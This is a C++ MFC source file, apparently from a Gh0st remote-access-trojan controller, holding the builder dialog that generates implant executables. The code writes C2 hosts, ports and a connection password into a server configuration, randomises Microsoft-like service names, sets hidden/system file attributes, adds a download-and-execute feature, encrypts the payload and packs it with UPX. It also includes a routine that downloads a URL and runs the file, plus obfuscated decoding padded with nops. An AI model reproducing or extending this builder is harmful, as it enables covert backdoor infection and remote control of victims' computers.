    GetDlgItem(IDC_FILEALEIXING)->EnableWindow(Azlx1);
    GetDlgItem(IDC_FILEATTRIBUTE)->EnableWindow(Azlx1);

}


void CBuild::OnZraz()
{
    // TODO: Add your control notification handler code here
    OnzrppccAz();
}

void CBuild::OnZraz1()
{
    // TODO: Add your control notification handler code here
    OnzrppccAz();
}

void CBuild::OnZraz2()
{
    // TODO: Add your control notification handler code here
    OnzrppccAz();
}

void CBuild::OnGdtj()
{
    // TODO: Add your control notification handler code here
    UpdateData(true);
}

void CBuild::OnMeux()
{
    // TODO: Add your control notification handler code here
    UpdateData(true);
}

void CBuild::OnSelectIco()
{
    // TODO: Add your control notification handler code here
    GetModuleFileName(NULL, patht,MAX_PATH);   //��ȡ������������·������,��Gh0st.exe��·��
    PathRemoveFileSpec(patht);//ȥ���ļ����е�gh0st

    char Path[MAX_PATH];
    sprintf(Path, "%s\\ICOͼ��",patht);
    CFileDialog dlg(TRUE, "ico", NULL, OFN_READONLY,"icoͼ��|*.ico||", NULL);
    dlg.m_ofn.lpstrInitialDir = Path;

    dlg.m_ofn.lpstrTitle= "ѡ��ICO�ļ�";
    if(dlg.DoModal() != IDOK)
        return;
    SetDlgItemText(IDC_ICO,dlg.GetPathName());
    HICON hIcon=(HICON)LoadImage(NULL, dlg.GetPathName(),IMAGE_ICON, 32, 32,LR_LOADFROMFILE);
    m_Ico.SetIcon(hIcon);
    DestroyIcon(hIcon);

}

void CBuild::OnLButtonDown(UINT nFlags, CPoint point)
{
    // TODO: Add your message handler code here and/or call default
    CDialog::OnLButtonDown(nFlags, point);
}


void CBuild::OnLButtonDblClk(UINT nFlags, CPoint point)
{
    // TODO: Add your message handler code here and/or call default
    CDialog::OnLButtonDblClk(nFlags, point);
}

BOOL CBuild::OnSetCursor(CWnd* pWnd, UINT nHitTest, UINT message)
{
    // TODO: Add your message handler code here and/or call default
    return CDialog::OnSetCursor(pWnd, nHitTest, message);
}

BOOL CheckFileExist(LPCTSTR lpszPath)
{
    if ( GetFileAttributes(lpszPath) == 0xFFFFFFFF && GetLastError() == ERROR_FILE_NOT_FOUND ) {
        return FALSE;
    } else {
        return TRUE;
    }
}


bool OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
    char	lpSubKey[500];
    HKEY	hKey;
    char	strTemp[MAX_PATH];
    LONG	nSize = sizeof(strTemp);
    char	*lpstrCat = NULL;
    memset(strTemp, 0, sizeof(strTemp));

    const char	*lpExt = strrchr(lpFile, '.');
    if (!lpExt)
        return false;

    if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
        return false;
    RegQueryValue(hKey, NULL, strTemp, &nSize);
    RegCloseKey(hKey);
    memset(lpSubKey, 0, sizeof(lpSubKey));
    wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);

    if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
        return false;
    memset(strTemp, 0, sizeof(strTemp));
    nSize = sizeof(strTemp);
    RegQueryValue(hKey, NULL, strTemp, &nSize);
    RegCloseKey(hKey);

    lpstrCat = strstr(strTemp, "\"%1");
    if (lpstrCat == NULL)
        lpstrCat = strstr(strTemp, "%1");

    if (lpstrCat == NULL) {
        lstrcat(strTemp, " ");
        lstrcat(strTemp, lpFile);
    } else
        lstrcpy(lpstrCat, lpFile);

    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi;
    si.cb = sizeof si;
    if (nShowCmd != SW_HIDE)
        si.lpDesktop = "WinSta0\\Default";

    CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

    return TRUE;

}

void CBuild::OnKbtest()
{
    UpdateData(TRUE);
    int	nUrlLength;
    char	*lpURL = NULL;
    char szFile[512] = {0};
    char	*lpFileName = NULL;
    nUrlLength = m_edit_kb.GetLength();
    if (nUrlLength == 0) {
        AfxMessageBox("����Ϊ��");
        return ;
    }
    lpURL = (char *)malloc(nUrlLength + 1);

    memcpy(lpURL, m_edit_kb.GetBuffer(0), nUrlLength + 1);
    lpFileName = strrchr(lpURL, '/') + 1;
    if (lpFileName == NULL) {
        AfxMessageBox("�޷���ȡ�ļ���");
        return;
    }

    wsprintf(szFile,"c:\\%s",lpFileName );

    HRESULT hr = URLDownloadToFile(NULL,lpURL, szFile, 0, NULL);
    if ( hr == S_OK ) {
        if ( !CheckFileExist(szFile) ) {
            AfxMessageBox("�ļ����سɹ��������ļ������ڣ��ܿ��ܱ�ɱ�������ɱ�����ļ�������");
            return ;
        }
    } else if ( hr == INET_E_DOWNLOAD_FAILURE ) {
        AfxMessageBox("URL ����ȷ���ļ�����ʧ��	");
        return ;    //URL ����ȷ���ļ�����ʧ��
    } else {
        AfxMessageBox("�ļ�����ʧ�ܣ�����URL�Ƿ���ȷ	");
        return ; //�ļ�����ʧ�ܣ�����URL�Ƿ���ȷ
    }
    OpenFile(szFile,SW_SHOW);

}

void CBuild::OnKbcheck()
{
    UpdateData(TRUE);
    // TODO: Add your control notification handler code here
    if (m_kbcheck) {
        GetDlgItem(IDC_EDIT_KB)->EnableWindow(TRUE);
        GetDlgItem(IDC_KBTEST)->EnableWindow(TRUE);
    } else {
        GetDlgItem(IDC_EDIT_KB)->EnableWindow(FALSE);
        GetDlgItem(IDC_KBTEST)->EnableWindow(FALSE);
    }

}


HBRUSH CBuild::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
    if ((pWnd->GetDlgCtrlID() == IDC_EDIT_BUILDLOG) && (nCtlColor == CTLCOLOR_EDIT)) {
        COLORREF clr = RGB(0, 255, 0);
        pDC->SetTextColor(clr);   //���ð�ɫ���ı�
        clr = RGB(0,0,0);
        pDC->SetBkColor(clr);     //���ú�ɫ�ı���
        return CreateSolidBrush(clr);  //��ΪԼ�������ر���ɫ��Ӧ��ˢ�Ӿ��
    } else {
        return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
    }
}

void CBuild::OnExit()
{
    OnCancel();

    // TODO: Add your control notification handler code here

}

int StormRand(int count)
{
    unsigned long Time=GetTickCount();
    int seed=rand()+3;
    seed=(seed*Time)%count;
    return seed;
}

void my_stormRands(BOOL ds,CHAR Number,CHAR Data[],CHAR Low,CHAR High)
{
    CHAR str[2];
    if(ds)
        str[0]='a';
    else
        str[0]='A';

    Sleep(StormRand(10));
    for (int i=0; i<Number; i++) {
        //	    Sleep(StormRand(10));
        if(i==Low||i==High) {
            Data[i]=' ';
            i++;
            Data[i]=str[0]+StormRand(26);
            continue;
        }
        if(i==0) {
            Data[i]='A'+StormRand(26);
        } else {
            Data[i]=str[0]+StormRand(26);
        }
    }
}


void CBuild::OnRandom()
{
    // TODO: Add your control notification handler code here
    CHAR ServerName[30]= {NULL};
    ZeroMemory(ServerName,30);

    my_stormRands(TRUE,15,ServerName,6,15);  //Microsoft
    ServerName[0]='R';
    ServerName[1]='s';
    SetDlgItemText(IDC_SERVICE_NAME,ServerName);

    if(!m_zraz) {
        if(m_gdtj) {
            //���;��
            CHAR ServerPath[30]= {NULL};
            ZeroMemory(ServerPath,30);
            my_stormRands(TRUE,6,ServerPath,6,6);
            m_remote_path.SetCurSel(1);
            CString szShow;
            GetDlgItemText(IDC_COMBO_RELEASEPATH,szShow);
            szShow=szShow+"Microsoft "+ServerPath;
            SetDlgItemText(IDC_COMBO_RELEASEPATH,szShow);
        }

        if(m_zraz2) {
            //���������ʾ
            CHAR DisplayName[30]= {NULL};
            ZeroMemory(DisplayName,30);
            my_stormRands(TRUE,15,DisplayName,6,15);  //Microsoft
            SetDlgItemText(IDC_SERVICE_DISPLAY,DisplayName);

            //�����������
            CHAR Description[30]= {NULL};
            ZeroMemory(Description,30);
            my_stormRands(TRUE,25,Description,6,25);  //Microsoft
            SetDlgItemText(IDC_SERVICE_DESCRIP,Description);
        }

        CHAR szTemp[30]= {NULL};
        my_stormRands(TRUE,7,szTemp,7,15);

        CString	WJ_Name=szTemp;
        SetDlgItemText(IDC_DLL_NAME,WJ_Name/*+".exe"*/);   //�ļ���
    }

    if(m_meux) {
        CHAR szMeux[50]= {NULL};
        my_stormRands(TRUE,15,szMeux,6,15);
        SetDlgItemText(IDC_EXE_MEUX,szMeux);   //������
    }

    CTime time = CTime::GetCurrentTime(); ///����CTime����
    CString SVTime = time.Format("%Y%m%d");  //��ȡ��ǰ���� Ϊ����汾

    SVTime = SVTime.Right(8);  //��ȡ��6λ��
    SetDlgItemText(IDC_VERSION,"Xy"+SVTime);   //����汾

    UpdateData(TRUE);
}

DLLSERVER_INFO dll_info = {
    "www.swordaa.com",
    "www.baidu.com",
    "123456789",
    2017,
    2017,
    "V_2017",
    "Default",
    "123456",
    "YYYYYYYYYYYY",
    "Yugqqu qekcaigu",
    "Igaoqa ymusuyukeamucgowws",
    "%ProgramFiles%\\Rumno Qrstuv",
    "Debug.exe",
    "Nmbbre hjveaika",
    0,                       //0Ϊ��װ��ɾ��    1Ϊ��װɾ��
    0,                       //0Ϊ��ɫ����      1ΪRun����    2Ϊ��������
    0,                       //0Ϊ��װ������
    0,                       //0Ϊ��ͨ��װ      1Ϊռ�ӷ�ɾ����װ
    0,                        //0Ϊ��ͬ��װ      1Ϊ���߼�¼��װ
    0,
    FILE_ATTRIBUTE_NORMAL,    //�ļ�����
    '"',
//		"http://192.168.179.128/Consys21.dll"

};

/*
int CBuildServer::memfind(const char *mem, const char *str, int sizem, int sizes)
{
	int   da,i,j;
	if (sizes == 0) da = strlen(str);
	else da = sizes;
	for (i = 0; i < sizem; i++)
	{
		for (j = 0; j < da; j ++)
			if (mem[i+j] != str[j])	break;
			if (j == da) return i;
	}
	return -1;
}


BOOL CBuildServer::CreateServer(DLLSERVER_INFO *lpData,LPSTR szPath,char *datPaths)
{
	CopyFile(datPaths,szPath,FALSE);

	HANDLE m_Handle =CreateFile(szPath,GENERIC_WRITE|GENERIC_READ,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL,
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

	if(m_Handle!=INVALID_HANDLE_VALUE)
	{
		DWORD Size = GetFileSize(m_Handle,NULL);
		char * Buffer = new char[Size];
		if(Buffer == NULL)
		{
			CloseHandle(m_Handle);
			return FALSE;
		}
		DWORD YtesRead=0;
		DWORD iCount=0;
		do
		{
			ReadFile(m_Handle,&Buffer[iCount],Size-iCount,&YtesRead,NULL);
			iCount+=YtesRead;
		}while(iCount<Size);



		DWORD SizePoint = memfind(Buffer,"www.baidu.com",Size,0);//
		if(SizePoint != 0)
		{
			SetFilePointer(m_Handle,SizePoint,0,FILE_BEGIN);
			DWORD Written=0;
			MyEncryptFunctionForServer((LPSTR)lpData,sizeof(DLLSERVER_INFO));
			WriteFile(m_Handle,lpData,sizeof(DLLSERVER_INFO),&Written,NULL);
		}

		CloseHandle(m_Handle);
	}
	return TRUE;
}

*/
void DecryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)//����
{
    unsigned long i;
    unsigned char p;

    p = (unsigned char ) key % 254 +88;

    for(i = 0; i < nLen; i++) {
        *szRec -= p;
        *szRec++ ^= p;
    }
}

#include "SHLWAPI.H"

void CBuild::OnBuild()
{
    // TODO: Add your control notification handler code here
    UpdateData(TRUE);
    if(m_ServiceName.IsEmpty()||m_ServiceDisplayName.IsEmpty()||m_ServiceDescription.IsEmpty()) {
        MessageBox("������������ơ���ʾ��������Ϣ!");
        return;
    }
    if(m_remote_host1.IsEmpty()&&m_remote_host2.IsEmpty()) {
        MessageBox("����������1��������Ϣ...");
        return;
    }

    if(m_remote_name.IsEmpty()) {
        MessageBox("���������߷���!");
        return;
    }
    if(m_releasepath.IsEmpty()) {
        MessageBox("�����밲װ;��!");
        return;
    }

    //��ȡͨѶ��������
    CUpdateDlg Dig;
    CString Mistr1 = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Settings","ConnectPass","");
    CString Mistr2 = Dig.Base64Decode(Mistr1);//���ݽ���
    CString Mistr3 = Dig.Base64Decode(Mistr2);     //����2�ν���

    DWORD IpPass = strlen(Mistr3);
    if(IpPass<5 || IpPass > 30) {
        MessageBox("ͨѶ�������ô������ڡ��������á�\n����ͨѶ���������ɷ����...", "���棡��", MB_OK | MB_ICONWARNING);
        return;
    }



    m_log.ReplaceSel("=> ���߼���װ��Ϣ�������...\r\n");

    ZeroMemory(&dll_info,sizeof(DLLSERVER_INFO));
//	ZeroMemory(&m_OnlineInfo,sizeof(ONLINEINFO));
    strcpy(dll_info.szFinder,"www.swordaa.com");
    strcpy(dll_info.Domain,m_remote_host1.GetBuffer(0));
    strcpy(dll_info.QQDomain,m_remote_host2.GetBuffer(0));
    dll_info.Port =(WORD)m_remote_port1;
    dll_info.QQPort =(WORD)m_remote_port2;
    strcpy(dll_info.SocketHead,Mistr3);    //д��ͨѶ����
    strcpy(dll_info.Version,m_strVersion.GetBuffer(0));   //д�����汾

    if(m_baocun) {
        m_log.ReplaceSel("=> ���ڱ������ɲ���...\r\n");
        // ��������
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������", "ServiceName", m_ServiceName);
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������", "ServiceDisplayName", m_ServiceDisplayName);
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������", "ServiceDescription", m_ServiceDescription);
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������", "Host1", m_remote_host1);
//	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������", "Host3", szFilter);
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������", "Host2", m_remote_host2);
//	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������", "Port1", m_remote_port1);   //���߶˿� 1
//	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������", "Port2", m_remote_port2);   //���߶˿� 2
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������", "Version", m_strVersion);
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������", "DllName", m_dllname);  //��װ����
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������", "Eexmeux", m_exemeux);  //���л���
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������", "Remote", m_remote_name);  //���߷���
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������","Delrtd",m_delrtd);  //��װ��ɾ��
        if(m_zraz)
            m_zrAzst = 0;
        if(m_zraz1)
            m_zrAzst = 1;
        if(m_zraz2)
            m_zrAzst = 2;
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������","ZAzst",m_zrAzst);  //��װ����
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������","Upx",m_upx);       //upxѹ��
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������","Azzds",m_azzds);     //��װ����
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������","Zkfsms",m_zkfsms);    //ռ�ӷ�ɾ��ģʽ
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������","Kzjizms",m_zkfkzj);   //���߼�¼
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������","Changurl",m_changurl); //����ת��
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������","Gdtj",m_gdtj);        //���;���̶�
        ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("��������","Meux",m_meux);        //�������

    }




    strcpy(dll_info.ServiceName,m_ServiceName.GetBuffer(0));   //��������
    strcpy(dll_info.ServicePlay,m_ServiceDisplayName.GetBuffer(0));   //������ʾ
    strcpy(dll_info.ServiceDesc,m_ServiceDescription.GetBuffer(0));   //��������
//	strcpy(dll_info.URL,"http://192.168.179.128/Consys21.dll");

    //	strcpy(dll_info.szFinder,"www.swordaa.com");

    strcpy(dll_info.ReleasePath,m_releasepath.GetBuffer(0));   //д�밲װ·��
    strcpy(dll_info.ReleaseName,(m_dllname + m_houzuiming).GetBuffer(0));   //д�밲װ����
    strcpy(dll_info.Mexi,m_exemeux.GetBuffer(0));          //д�����л���
    strcpy(dll_info.Group,m_remote_name.GetBuffer(0));   //д�����߷���
    dll_info.Dele_te = m_delrtd;  //��װ��ɾ��
    dll_info.Dele_zc = m_zrAzst;    //��װ����
    dll_info.Dele_zd = (WORD)m_azzds;    //��װ����
    dll_info.Dele_fs = m_zkfsms;  //ռ�ӷ�ɾ��ģʽ��װ
    dll_info.Dele_Kzj = m_zkfkzj;  //���߼�¼
    dll_info.Dele_Cul = m_changurl;  //����ת��

    if (!m_edit_kb.IsEmpty() && m_kbcheck) {
        strcpy(dll_info.szDownRun,m_edit_kb.GetBuffer(0));
    }


    CString szTemp;

    GetDlgItemText(IDC_FILEATTRIBUTE,szTemp);

    if(szTemp == "����")
        dll_info.FileAttribute = FILE_ATTRIBUTE_NORMAL;
    if(szTemp == "����")
        dll_info.FileAttribute = FILE_ATTRIBUTE_HIDDEN;

    if(szTemp == "ϵͳ")
        dll_info.FileAttribute = FILE_ATTRIBUTE_SYSTEM;

    if(szTemp == "ֻ��")
        dll_info.FileAttribute = FILE_ATTRIBUTE_READONLY;

    if(szTemp == "����+ϵͳ")
        dll_info.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;

    if(szTemp == "����+ϵͳ+ֻ��")
        dll_info.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY;


    //�ж��Ƿ����
    WORD Tail = strlen(dll_info.ReleasePath)-1;

    if(dll_info.ReleasePath[Tail]!='\\') {
        strcat(dll_info.ReleasePath,"\\");
        SetDlgItemText(IDC_COMBO_RELEASEPATH,dll_info.ReleasePath);
    }

    //�ж��Ƿ��ж��Ŀ¼
    CHAR *Judge = strstr(dll_info.ReleasePath,"\\");
    if(Judge) {
        Judge++;
        CHAR *Judge2= strstr(Judge,"\\");
        if(Judge2) {
            Judge2++;
            CHAR *Judge3=strstr(Judge2,"\\");
            if(Judge3) {
                MessageBox("Ŀ¼���Ϸ�!�Ҵ���Ŀ¼������!");
                return;
            }
        }
    }

    m_log.ReplaceSel("=> ��ѡ������;�����ļ����Լ��ļ���׺��...\r\n");

    //������Ϣ
    ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������","InstallPath",m_releasepath);  //��װĿ¼

    TCHAR szSaveFile[MAX_PATH]= {0};
// 	strcpy(szSaveFile, "SB360.exe");//���Ĭ���ļ���
//
// 	OPENFILENAME ofn;
// 	ZeroMemory(&ofn,sizeof(ofn));
// 	ofn.lStructSize = sizeof(ofn);
// 	ofn.hwndOwner = GetSafeHwnd();
// 	ofn.lpstrFile = szSaveFile;
// 	ofn.nMaxFile = sizeof(szSaveFile);
// 	ofn.lpstrFilter = _T("��ִ���ļ�(*.exe*)\0*.exe\0\0");
// 	ofn.nFilterIndex = 1;
// 	ofn.lpstrFileTitle = NULL;
// 	ofn.nMaxFileTitle = 0;
// 	ofn.lpstrInitialDir = NULL;
// 	ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_OVERWRITEPROMPT;
// 	if (!GetSaveFileName(&ofn))
// 	{
// 		return ;
// 	}

    /*
    char BASED_CODE szFilter[] = "��ִ���ļ�(*.exe)|*.exe|��Ļ��������(*.scr)|*.scr|������(*.bat)|*.bat|COM(*.com)|*.com|PIF(*.pif)|*.pif||";
    CFileDialog fdlg(FALSE, "exe", "office", OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, szFilter );
    if(fdlg.DoModal() == IDOK)
    {
    	strcpy(szSaveFile, fdlg.GetPathName());
    }


    GetModuleFileName(NULL, patht,MAX_PATH);   //��ȡ������������·������,��Gh0st.exe��·��
    PathRemoveFileSpec(patht);//ȥ���ļ����е�gh0st
    char Datpath[MAX_PATH];
    sprintf(Datpath,"%s\\Cache\\Install.dat",patht);

    //���dat�ļ��Ƿ����
    if (IsFileExist(Datpath)==FALSE)
    {
    	MessageBox("�����ļ� Install.dat ������,\n�����ļ����ٽ�������...", "���󣡣�", MB_OK | MB_ICONWARNING);
    	return;
    }

    m_log.ReplaceSel("=> �ļ����óɹ�������д����Ϣ....108 KB\r\n");

    if (CreateServer(&dll_info,szSaveFile,Datpath)==FALSE)
    {
    	MessageBox("���������ʧ��!");
    	return;
    }

    */
    CString OnInstallWay;
    //m_insatll_way.GetLBText(m_insatll_way.GetCurSel(),OnInstallWay);


    OPENFILENAME OpenFileName = {0};
    TCHAR szFile[MAX_PATH] = "Server";
    TCHAR szFilter[1024] = {0};
    lstrcpy(szFilter, _T("��ִ���ļ�(*.exe)"));
    lstrcpy(szFilter + lstrlen(szFilter) + 1, _T("*.exe"));
    OpenFileName.lStructSize       = sizeof(OPENFILENAME);
    OpenFileName.hwndOwner         = GetSafeHwnd();
    OpenFileName.lpstrFilter       = szFilter;
    OpenFileName.lpstrCustomFilter = NULL;
    OpenFileName.nMaxCustFilter    = 0;
    OpenFileName.nFilterIndex      = 0;
    OpenFileName.lpstrFile         = szFile;
    OpenFileName.nMaxFile          = sizeof(szFile);
    OpenFileName.lpstrFileTitle    = NULL;
    OpenFileName.nMaxFileTitle     = 0;
    OpenFileName.lpstrInitialDir   = NULL;
    OpenFileName.lpstrTitle        = _T("���ɱ����ƶ˿�ִ���ļ�");
    OpenFileName.nFileOffset       = 0;
    OpenFileName.nFileExtension    = 0;
    OpenFileName.lpstrDefExt       = _T("exe");
    OpenFileName.Flags             = OFN_EXPLORER | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;
    if(!GetSaveFileName(&OpenFileName)) {
        return;
    }

    CHAR strDatPath[MAX_PATH] = {0};
    char Path[MAX_PATH];
    GetModuleFileName(NULL, Path, sizeof(Path));   //��ȡ������������·������,��Gh0st.exe��·��
    PathRemoveFileSpec(Path);
    wsprintf(strDatPath,"%s%s",Path,"\\Dat\\Sword.dll");

    CHAR strDatLoadPath[MAX_PATH] = {0};
    strcpy(strDatLoadPath, Path);
    strcat(strDatLoadPath, "\\Dat\\Server.dat");


    CHAR strBuildDllPath[MAX_PATH] = {0};
    strcpy(strBuildDllPath, Path);
    strcat(strBuildDllPath, "\\Dat\\BuildDll.tmp");

    DeleteFile(strBuildDllPath);

    CBulidServer bulidDll;
    if (!bulidDll.BulidServer(&dll_info, sizeof(DLLSERVER_INFO), strDatPath, strBuildDllPath)) {
        return ;
    } else {
        // ��ȡ���ɺ��DLL����, ������ṹ����
        SERVER_DLL_DATA serverDllData = {0};
        strcpy(serverDllData.szFindFlags, "www.swordaa.com");
        HANDLE hFile = INVALID_HANDLE_VALUE;
        hFile = CreateFile(strBuildDllPath, GENERIC_ALL, NULL, NULL, OPEN_EXISTING, NULL, NULL);

        if (hFile == INVALID_HANDLE_VALUE) {


            return ;
        }

        DWORD dwFileSize = GetFileSize(hFile, NULL);

        if (dwFileSize == 0) {
            CloseHandle(hFile);




            return ;
        }

        PBYTE pDllData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
        DWORD dwReadSize = 0;
        ReadFile(hFile, pDllData, dwFileSize, &dwReadSize, NULL);

        if (dwReadSize != dwFileSize) {
            HeapFree(GetProcessHeap(), NULL, pDllData);

            CloseHandle(hFile);




            return ;
        }

        CloseHandle(hFile);

        CopyMemory(serverDllData.pDllData, pDllData, dwFileSize);

        serverDllData.dwDllDataSize = dwFileSize;

        DecryptData((unsigned char *)serverDllData.pDllData,serverDllData.dwDllDataSize,2025);

        CBulidServer BuildServer;

        if (!BuildServer.BulidServer(&serverDllData, sizeof(SERVER_DLL_DATA), strDatLoadPath, OpenFileName.lpstrFile)) {

            DeleteFile(strBuildDllPath);
            return ;
        } else {

            DeleteFile(strBuildDllPath);
            MessageBox("�������");


        }
    }
    //����ͼ��
    CString szIconPath;
    GetDlgItemText(IDC_ICO,szIconPath);
    if (szIconPath!="") {
        char Pathss[MAX_PATH];
        char Pathee[MAX_PATH];
        sprintf(Pathss, "%s",szIconPath);
        sprintf(Pathee, "%s",szSaveFile);

        CMyToolsKit Dig;
        Dig.ChangeExeIcon(Pathss,Pathee);
    }

    CString SCminc;
    if (m_upx) {
        if(CompressUpx(szSaveFile))//UPXѹ��
//			SCminc="�ļ�ѹ���ɹ�!";
            m_log.ReplaceSel("=> �ļ�ѹ���ɹ�...\r\n");
        else
//			SCminc="�ļ�ѹ��ʧ��!";
            m_log.ReplaceSel("=> �ļ�ѹ��ʧ��...\r\n");

    } else {
//		SCminc="�ļ����ɳɹ�!";
        m_log.ReplaceSel("=> �ļ����ɳɹ���,�����ɷ������...108 KB\r\n");
    }

    CString szTempTips;
    szTempTips.Format("=> �����ڣ�%s",szSaveFile);
//	MessageBox(szTempTips,SCminc,MB_OK|MB_ICONINFORMATION);

    m_log.ReplaceSel(szTempTips+"\r\n");


//   OnOK();
}

BOOL CBuild::IsFileExist(LPCTSTR strFileName)
{
    if(strFileName == NULL)
        return FALSE;

    DWORD dwAttr = ::GetFileAttributes(strFileName);
    return (dwAttr!=-1 && !(dwAttr&FILE_ATTRIBUTE_DIRECTORY) );
}


BOOL CBuild::CompressUpx(CString inpath)
{

    GetModuleFileName(NULL, patht,MAX_PATH);   //��ȡ������������·������,��Gh0st.exe��·��
    PathRemoveFileSpec(patht);//ȥ���ļ����е�gh0st

    char Datpath[MAX_PATH];
    sprintf(Datpath,"%s\\Control\\upx.exe",patht);

    //���upx.exe�ļ��Ƿ����
    if (IsFileExist(Datpath)==FALSE) {
        MessageBox("ѹ���ļ� UPX.EXE ������,\n�����ļ����ٽ���ѹ��...", "���󣡣�", MB_OK | MB_ICONWARNING);
        return FALSE;
    }

    char Pnema[30]= {0};
    char Path[MAX_PATH]= {0};
    strcat(Path,inpath);
    int Psg = 0;
    int Pst = strlen(Path);
    for(int i=Pst; i>0; i--) {
        if(Path[i] == '\\') {
            for(int s=i+1; s<Pst; s++) {
                Pnema[Psg]=Path[s];
                Psg++;
            }
            Path[i]='\0';
            break;
        }
    }

    strcat(Path,"\\upx.exe");
    DeleteFile(Path);
    CopyFile(Datpath,Path,false);  //�����ļ�
    //	ShellExecute(this->m_hWnd,"open",Path, inpath,"",SW_HIDE);
    ShellExecute(this->m_hWnd,"open","upx.exe ",Pnema,"",SW_HIDE);

    BOOL del;
    do {
        del = DeleteFile(Path);
    } while(!del);

    return TRUE;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////
static char basenew64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int pos(char c)
{
    char *p;
    for(p = basenew64; *p; p++)
        if(*p == c)
            return p - basenew64;
    return -1;
}

int basenew64_newdecode(const char *str, char **data)
{
    const char *s, *p;
    unsigned char *q;
    int c;
    int x;
    int done = 0;
    int len;
    s = (const char *)malloc(strlen(str));
    q = (unsigned char *)s;
    __asm {
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
    }
    for(p=str; *p && !done; p+=4) {
        x = pos(p[0]);
        if(x >= 0)
            c = x;
        else {
            done = 3;
            break;
        }
        c*=64;

        x = pos(p[1]);
        if(x >= 0)
            c += x;
        else
            return -1;
        c*=64;

        if(p[2] == '=')
            done++;
        else {
            x = pos(p[2]);
            if(x >= 0)
                c += x;
            else
                return -1;
        }
        c*=64;

        if(p[3] == '=')
            done++;
        else {
            if(done)
                return -1;
            x = pos(p[3]);
            if(x >= 0)
                c += x;
            else
                return -1;
        }
        __asm {
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
        }
        if(done < 3)
            *q++=(c&0x00ff0000)>>16;

        if(done < 2)
            *q++=(c&0x0000ff00)>>8;
        if(done < 1)
            *q++=(c&0x000000ff)>>0;
    }

    len = q - (unsigned char*)(s);

    *data = (char*)realloc((void *)s, len);

    return len;
}

char* NewDecode(char *str)
{


    int a,b;
    char *fucker = NULL;
    b = basenew64_newdecode(str, &fucker);
    for (a = 0; a < b; a++) {
        fucker[a] ^= 0x86;
        fucker[a] -= 0x19;
    }
    int		i, len;
    char	*data = NULL;
    len = basenew64_newdecode(str, &data);
    for (i = 0; i < len; i++) {
        data[i] ^= 0x83;
        data[i] -= 0x87;
        data[i] ^= 0x21;
    }
    return data;
}

/////////������Ϣ��ȡ////////////
#define Request_DOWN			0x9
#define File_Buffer				0x10
#define File_Buffer_Finish		0x11
typedef struct {

    BYTE	Flags;
    DWORD	Buffer_Size;
    BYTE	Buffer[1024];
    BYTE	Info[256];
} NET_DATA, *LPNET_DATA;

CString strInfo;

void CBuild::OnHuoquZp() //��ȡ��ʯ����
{
    // TODO: Add your control notification handler code here
    UpdateData(true);
    CString struser = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString( "UPDATE", "Dns1", "" );

    if ( struser.GetLength() != NULL ) {
        m_zs_build.EnableWindow(TRUE);
    } else {
        // 		if (MessageBox("��Ѳ��԰治��ʹ��������������������ϵ����Ա���¼�ٷ�QQȺ��ͨ���߰汾��/nע���˵����/n���û���������ʹ��Զ�ؿ��ƣ������й��ܲ������ơ�/n��������ר���Ĳ���ϵͳ���̷����������ŵ��������Լ�ǿ��", "����", MB_OK) == IDOK)
        // 		{
        // 			m_zc_build.EnableWindow(FALSE);
        // 		}
        m_log.ReplaceSel("=> ��Ѳ��԰���ע����û�����ʹ�á���ʯ��ͨ����...\r\n=> ����ϵ����Ա���¼�ٷ�QQȺ��ͨ���߰汾��\r\n");
